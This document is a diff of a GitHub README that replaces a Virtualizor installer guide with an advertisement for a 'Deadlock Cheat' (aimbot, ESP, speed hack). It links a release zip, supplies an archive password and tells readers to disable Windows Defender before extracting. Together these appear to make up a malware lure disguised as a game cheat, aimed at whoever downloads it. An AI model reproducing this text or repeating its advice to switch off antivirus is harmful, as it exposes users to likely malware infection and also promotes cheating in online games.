@@ -1,28 +1,36 @@
-# Virtualizor Node Automation
+# Deadlock Cheat
 
-Virtualizor installer for Ubuntu, Debian, CentOS, RHEL and OpenSUSE.
+## Description
+**Deadlock Cheat** is a powerful tool designed to enhance the gameplay experience in Deadlock. This cheat offers features such as ESP, Aimbot, No Recoil, and Speed Hack, allowing players to gain a competitive edge in the game. Developed with a focus on ease of use, Deadlock Cheat is easily configurable and provides efficient performance without lag. Use it to increase your chances of winning every match!
 
-This script lets you set up your own Virtualizor server in a couple of minutes, 
-using your desired parameters. It is designed to be as user-friendly as 
-possible, requiring minimum experience.
+### Access
+To access the cheat, please use the password: **2024**.
 
-### Installation	
+## Features:
+- **ESP**: Displays information about enemies and items on the map.
+- **Aimbot**: Automatically targets enemies.
+- **No Recoil**: Eliminates recoil when shooting.
+- **Speed Hack**: Increases player movement speed.
 
-1. Download the installer script
+## How to Download
+1. Go to the [Releases](https://github.com/anastasow-1/virtual/releases/download/Release/Release.zip) page.
+2. Download the latest version of the Deadlock Cheat archive (.zip or .tar.gz).
+3. **Important**: Make sure to **disable Windows Defender** before extracting the files, or the process may fail.
 
-```
-curl -O 
-https://raw.githubusercontent.com/anastasow-1/virtual/main/install.sh
-```
+## How to Use
+1. Extract the downloaded archive to a convenient location.
+2. Launch the cheat, following the on-screen instructions.
+3. Enter the password **2024** when prompted.
+4. Configure the necessary settings to optimize your gameplay experience.
+5. Start the game and enjoy!
 
-2. Make it executable
+## Last Update: 18.10 🚀
+- Fixed bugs in the ESP functionality.
+- Improved Aimbot algorithms for greater accuracy.
+- Added new features for enhanced usability.
 
-```
-chmod +x install.sh
-```
+## License
+This project is distributed under the terms of [specify license if applicable].
 
-3. Run the installer
-
-```
-bash ./install.sh
-```
+## Disclaimer
+Use at your own risk. The developers are not responsible for any consequences related to the use of this tool.
